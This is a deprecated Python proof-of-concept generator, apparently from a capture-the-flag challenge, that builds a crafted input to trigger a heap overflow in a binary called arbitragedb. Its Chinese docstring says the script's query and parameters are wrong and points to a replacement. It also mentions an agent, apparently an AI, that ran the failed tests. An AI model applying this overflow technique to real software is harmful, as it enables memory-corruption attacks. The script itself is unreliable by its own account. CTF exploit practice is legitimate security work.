#!/usr/bin/env python3
"""
⚠️⚠️ DEPRECATED（2026-09-18）—— 請改用 stage1.py，不要用這支。⚠️⚠️

這支的 SELECT 語法與 varint 參數**兩者都是錯的**，照著跑會得到
「什麼都沒發生」的假陰性結論（pc_agent 第一次測試失敗就是踩到這個）：

  1. 查詢 `SELECT 1 FROM sys_imports`（第 50 行）兩個雷都踩到：
     - 缺字面分號 `;` → handler 直接回 ERR syntax
     - 含 `SELECT 1` → 走 0x5482 捷徑，只印假的 `ROW int:1`，蓋掉 sys_imports 的列
     正確查詢是 `SELECT * FROM sys_imports;`
  2. 參數 B=0, C=0 是**單 byte** varint，不會觸發 sub_4566 的 `and 0x7f` 截斷
     → arg4 == arg5 → **UAF 閘門必關**。要開 UAF 必須 varint#2 >= 0x80（建議 0xff）。
     pc_agent 實測此組不會 crash。

保留此檔僅為歷史紀錄。正確入口：Pwn/arbitragedb/stage1.py（已含 assert 自我驗證）。

---

Pwn/arbitragedb — heap overflow PoC generator (static-analysis derived).

漏洞：sub_4604 把 malloc 大小 clamp 到 0x1000，但 memcpy 長度取
      max(remaining, C)，remaining 由 IMPORT SIZE 控制（最大 0x4000）。

用法（Linux，pc_agent）：
    python3 gen_poc.py > poc.bin
    ./arbitragedb formal_state < poc.bin          # 觀察是否 crash
    ADB_NO_SECCOMP=1 gdb --args ./arbitragedb formal_state
"""
import sys, struct

def lv(n: int) -> bytes:
    """LEB128 varint"""
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)

def build(overflow: bytes, B: int = 0, C: int = 0) -> bytes:
    """
    body = "ADB1" + 12 filler (共 0x10 header)
         + varint(A) + varint(B) + varint(C)
         + payload            <- payload 就是溢出資料
    memcpy 長度 = max(len(payload), C)，配置量 = min(B+0x18, 0x1000)
    """
    body = bytearray(b"ADB1" + b"\x00" * 12)   # 0x10 header
    body += lv(1)          # A：只影響 off 前進
    body += lv(B)          # B：決定 alloc = min(B+0x18, 0x1000)
    body += lv(C)          # C：必須 <= 0x80
    body += overflow       # remaining = len(overflow)
    return bytes(body)

def main():
    # alloc = 0+0x18 = 0x18，但 copylen = remaining ≈ 0x2000 → 溢出約 0x1fe8
    overflow = b"A" * 0x2000
    body = build(overflow, B=0, C=0)
    size = len(body)
    assert size <= 0x4000, f"SIZE {size} 超過 0x4000 上限"
    assert size > 0x11, "SIZE 必須 > 0x11"

    out = sys.stdout.buffer
    out.write(b"IMPORT tbl FORMAT ADB1 SIZE %d\n" % size)
    out.write(body)
    out.write(b"SELECT 1 FROM sys_imports\n")   # 觸發後續存取 / 看有無 leak
    out.write(b"QUIT\n")
    out.flush()

    print(f"[*] body size = {size} (0x{size:x})", file=sys.stderr)
    print(f"[*] alloc     = 0x18  (B=0 → min(0x18,0x1000))", file=sys.stderr)
    print(f"[*] memcpy    = 0x{len(overflow):x}  → overflow 約 0x{len(overflow)-0x18:x} bytes",
          file=sys.stderr)

if __name__ == "__main__":
    main()
